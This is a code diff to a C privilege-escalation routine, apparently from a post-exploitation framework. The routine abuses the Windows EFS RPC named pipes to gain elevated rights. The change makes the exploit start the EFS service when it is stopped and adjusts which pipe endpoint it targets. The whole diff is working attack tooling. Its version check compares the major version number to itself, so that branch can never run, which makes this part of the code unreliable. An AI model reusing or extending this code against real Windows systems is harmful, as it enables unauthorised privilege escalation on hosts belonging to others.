@@ -1,8 +1,11 @@
 #include "precomp.h"
 #include "common_metapi.h"
 #include "namedpipe.h"
+#include "service.h"
 
 typedef NTSTATUS(WINAPI* PRtlGetVersion)(LPOSVERSIONINFOEXW);
+
+void switch_to_lsarpc_endpoint();
 
 RPC_STATUS EfsRpcEncryptFileSrv(handle_t binding_h, wchar_t* FileName);
 
@@ -13,6 +16,8 @@ const RPC_WSTR LSARPC_PIPE_MS_EFSR_UUID = (RPC_WSTR)L"c681d488-d850-11d0-8c52-00
 const RPC_WSTR LSARPC_NAMEDPIPE = (RPC_WSTR)L"\\pipe\\lsarpc";
 const RPC_WSTR EFSRPC_PIPE_MS_EFSR_UUID = (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d";
 const RPC_WSTR EFSRPC_NAMEDPIPE = (RPC_WSTR)L"\\pipe\\efsrpc";
+
+char* EFS_SERVICE_NAME = "EFS";
 
 DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 {
@@ -50,18 +55,42 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: Windows versions older than 6.0 are unsupported");
 		}
 
-		// Windows Vista / Server 2008 (6.0 and 6.1) only supports \pipe\lsarpc endpoint
-		if (os.dwMajorVersion == 6 && (os.dwMajorVersion == 0 || os.dwMajorVersion == 1)) {
+		// Windows Vista / Server 2008 and prior only supports \pipe\lsarpc endpoint
+		if ((os.dwMajorVersion < 6) || (os.dwMajorVersion == 6 && (os.dwMajorVersion == 0 || os.dwMajorVersion == 1))) {
 			if (!does_pipe_exist(L"\\\\.\\pipe\\lsarpc")) {
 				BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: \\pipe\\lsarpc is not listening.");
 			}
+			switch_to_lsarpc_endpoint();
 			wEndpointUUID = &LSARPC_PIPE_MS_EFSR_UUID;
 			wNamedPipeEndpoint = &LSARPC_NAMEDPIPE;
 		}
 		else {
+			DWORD state;
+			if (query_service_status(EFS_SERVICE_NAME, &state) != ERROR_SUCCESS) {
+				BREAK_ON_ERROR("[ELEVATE] query_service_status: query service efs status failed.");
+			}
+
+			if (state != SERVICE_RUNNING && state != SERVICE_START_PENDING && state != SERVICE_CONTINUE_PENDING) {
+				dprintf("[ELEVATE] query_service_status: efs service is not running. Trying to start ..");
+				if (service_start(EFS_SERVICE_NAME) != ERROR_SUCCESS) {
+					BREAK_ON_ERROR("[ELEVATE] service_start: starting efs service failed.");
+				}
+			}
+
+			if (query_service_status(EFS_SERVICE_NAME, &state) != ERROR_SUCCESS) {
+				BREAK_ON_ERROR("[ELEVATE] query_service_status: query service efs status failed.");
+			}
+
+			if (state != SERVICE_RUNNING && state != SERVICE_START_PENDING && state != SERVICE_CONTINUE_PENDING) {
+				dprintf("[ELEVATE] query_service_status: efs service is not running.");
+			}
+
+			Sleep(5000);
+
 			if (!does_pipe_exist(L"\\\\.\\pipe\\efsrpc")) {
 				BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: \\pipe\\efsrpc is not listening.");
 			}
+
 			wEndpointUUID = &EFSRPC_PIPE_MS_EFSR_UUID;
 			wNamedPipeEndpoint = &EFSRPC_NAMEDPIPE;
 		}
